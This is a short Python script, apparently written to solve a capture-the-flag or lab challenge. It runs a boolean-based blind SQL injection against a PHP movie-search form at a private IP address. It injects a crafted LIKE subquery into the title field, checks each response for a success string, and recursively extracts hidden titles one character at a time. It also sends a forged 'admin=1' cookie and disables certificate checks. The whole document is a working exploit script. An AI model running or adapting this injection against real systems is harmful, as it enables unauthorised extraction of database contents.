#!/usr/bin/python
import urllib.parse
import requests

def test_title(title):
    querydata = { 'title': "' or ((select count(*) from movies where title like '" + title + "') > 0);", 'action': 'search'}
    payload = urllib.parse.urlencode(querydata)
    url = "https://172.27.36.9:4431/index.php"
    headers = {
        'origin': "https://172.27.36.9:4431",
        'x-devtools-emulate-network-conditions-client-id': "9b00078b-02ca-45c5-aecb-9736570cbeae",
        'upgrade-insecure-requests': "1",
        'user-agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36",
        'content-type': "application/x-www-form-urlencoded",
        'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        'referer': "https://172.27.36.9:4431/index.php",
        'accept-encoding': "gzip, deflate, br",
        'accept-language': "en-IN,en-GB;q=0.8,en-US;q=0.6,en;q=0.4",
        'cookie': "admin=1; PHPSESSID=la9hiu6k4gm79k8t6fhta06d62",
        'cache-control': "no-cache",
        }

    response = requests.request("POST", url, data=payload, headers=headers, verify=False)
    if "Wow there's a movie there" in response.text:
        print(title)
        return True
    return False

start = 32 
def recursive(prefix):
    for i in range(start, 127):
        if(i == 37 or i == 95):
            continue  # avoid lots of %'s
        if(test_title(prefix + chr(i) + "%")):
            recursive(prefix + chr(i))

recursive("AS")

